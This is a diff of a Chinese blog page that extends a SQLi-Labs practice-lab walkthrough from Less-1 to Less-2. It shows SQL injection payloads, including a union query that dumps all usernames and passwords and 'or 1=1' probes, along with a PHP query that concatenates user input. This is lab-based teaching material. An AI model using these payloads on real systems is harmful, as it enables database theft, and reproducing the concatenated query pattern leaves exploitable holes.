@@ -89,7 +89,7 @@
 <meta name="description" content="前言 注入过程    一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
 <meta name="keywords" content="SQL注入,SQLi-Labs,报错注入,联合查询">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQLi-Labs第一关">
+<meta property="og:title" content="SQLi-Labs第一章（未完）">
 <meta property="og:url" content="https://cjjkkk.github.io/sqli-libs-first/index.html">
 <meta property="og:site_name" content="Jacky Cheng">
 <meta property="og:description" content="前言 注入过程    一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
@@ -105,9 +105,12 @@
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/9.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/10.jpg">
 <meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/11.jpg">
-<meta property="og:updated_time" content="2019-04-04T13:49:35.994Z">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/12.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/13.jpg">
+<meta property="og:image" content="https://cjjkkk.github.io/image/sqli-libs-first/14.jpg">
+<meta property="og:updated_time" content="2019-05-02T14:10:43.421Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQLi-Labs第一关">
+<meta name="twitter:title" content="SQLi-Labs第一章（未完）">
 <meta name="twitter:description" content="前言 注入过程    一. 前言1. 什么是SQL注入所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。">
 <meta name="twitter:image" content="https://cjjkkk.github.io/image/sqli-libs-first/1.jpg">
 
@@ -145,7 +148,7 @@
 
 
 
-  <title>SQLi-Labs第一关 | Jacky Cheng</title>
+  <title>SQLi-Labs第一章（未完） | Jacky Cheng</title>
   
 
 
@@ -321,7 +324,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">SQLi-Labs第一关</h1>
+          <h1 class="post-title" itemprop="name headline">SQLi-Labs第一章（未完）</h1>
         
 
         <div class="post-meta">
@@ -387,7 +390,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  551
+                  721
                 </span>
               
 
@@ -421,13 +424,14 @@
 <hr>
 <h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h2><h3 id="1-什么是SQL注入"><a href="#1-什么是SQL注入" class="headerlink" title="1. 什么是SQL注入"></a>1. 什么是SQL注入</h3><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p>
 <a id="more"></a>
+<p>第一章的22关会慢慢更新，有时间就写。</p>
 <p><br></p>
-<h2 id="二-注入过程"><a href="#二-注入过程" class="headerlink" title="二. 注入过程"></a>二. 注入过程</h2><h3 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1. 测试环境"></a>1. 测试环境</h3><blockquote>
+<h2 id="二-注入过程"><a href="#二-注入过程" class="headerlink" title="二. 注入过程"></a>二. 注入过程</h2><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><blockquote>
 <p>MySQL 5.5.53</p>
 <p>PHP 5.6.27-nts</p>
 <p>Apache  2.4</p>
 </blockquote>
-<h3 id="2-注入过程"><a href="#2-注入过程" class="headerlink" title="2. 注入过程"></a>2. 注入过程</h3><p>1）首先进入SQLi-Labs，选择第一题</p>
+<h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>1）首先进入SQLi-Labs，选择第一题</p>
 <p><img src="\image\sqli-libs-first\1.jpg" alt="1"></p>
 <p>2）在地址后输入<code>?id=1</code>，发现可以显示用户信息，说明不是数值查询</p>
 <p><img src="\image\sqli-libs-first\2.jpg" alt="2"></p>
@@ -455,6 +459,18 @@
 <p>11）最后查询所有的用户名和密码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=15&apos; union select 1,(select group_concat(username) from security.users),(select group_concat(password) from security.users) --+</span><br></pre></td></tr></table></figure>
 <p><img src="\image\sqli-libs-first\11.jpg" alt="11"></p>
+<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>同样的我们先输入参数<code>?id=1</code></p>
+<p><img src="\image\sqli-libs-first\12.jpg" alt="12"></p>
+<p>将参数改为<code>?id=1&#39;</code>后报错</p>
+<p><img src="\image\sqli-libs-first\13.jpg" alt="13"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>
+<p>意思是单引号破坏了查询导致了错误，所以说，查询代码使用了整数。可以使用<code>?id=1--+</code>来注释掉剩余查询</p>
+<p><img src="\image\sqli-libs-first\14.jpg" alt="14"></p>
+<p>查看代码可以看到具体的查询语句如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure>
+<p>使用以下payload均显示正常</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1--+ or 1=1</span><br><span class="line">?id=1 or 1=1 --+</span><br></pre></td></tr></table></figure>
+<p>其余步骤与Less-1相同</p>
 
       
     </div>
@@ -483,11 +499,11 @@
   <!-- JS库 sweetalert 可修改路径 -->
   <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
   <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
-  <p><span>本文标题:</span><a href="/sqli-libs-first/">SQLi-Labs第一关</a></p>
+  <p><span>本文标题:</span><a href="/sqli-libs-first/">SQLi-Labs第一章（未完）</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Jacky Cheng 的个人博客">Jacky Cheng</a></p>
   <p><span>发布时间:</span>2019年04月04日 - 19:04</p>
-  <p><span>最后更新:</span>2019年04月04日 - 21:04</p>
-  <p><span>原始链接:</span><a href="/sqli-libs-first/" title="SQLi-Labs第一关">https://cjjkkk.github.io/sqli-libs-first/</a>
+  <p><span>最后更新:</span>2019年05月02日 - 22:05</p>
+  <p><span>原始链接:</span><a href="/sqli-libs-first/" title="SQLi-Labs第一章（未完）">https://cjjkkk.github.io/sqli-libs-first/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://cjjkkk.github.io/sqli-libs-first/" aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
@@ -751,7 +767,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是SQL注入"><span class="nav-text">1. 什么是SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-注入过程"><span class="nav-text">二. 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-测试环境"><span class="nav-text">1. 测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-注入过程"><span class="nav-text">2. 注入过程</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一-前言"><span class="nav-text">一. 前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-什么是SQL注入"><span class="nav-text">1. 什么是SQL注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二-注入过程"><span class="nav-text">二. 注入过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-1"><span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-2"><span class="nav-text">Less-2</span></a></li></ol></li></ol></div>
             
 
           </div>
